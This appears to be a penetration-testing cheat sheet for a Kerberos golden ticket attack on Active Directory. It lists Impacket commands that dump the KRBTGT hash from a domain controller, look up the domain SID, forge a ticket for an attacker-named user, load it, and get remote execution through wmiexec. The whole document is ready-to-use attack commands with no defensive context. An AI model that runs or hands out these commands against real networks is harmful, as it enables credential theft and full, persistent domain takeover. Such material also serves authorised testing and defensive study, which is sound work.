### Get KRBTGT hash
```
impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost> -just-dc-user krbtgt
```

### Get Domain SID
```
impacket-lookupsid <domain>/<user>:<password>@<rhost>
```

### Create ticket
```
impacket-ticketer -nthash <ntlmHash> -domain-sid <sid> -domain <domain> <attackerUser>
```

### Export ticket
```
export KRB5CCNAME=<ticketFile>
```

### Use ticket
```
impacket-wmiexec -k -no-pass <fqdnRhost>
```

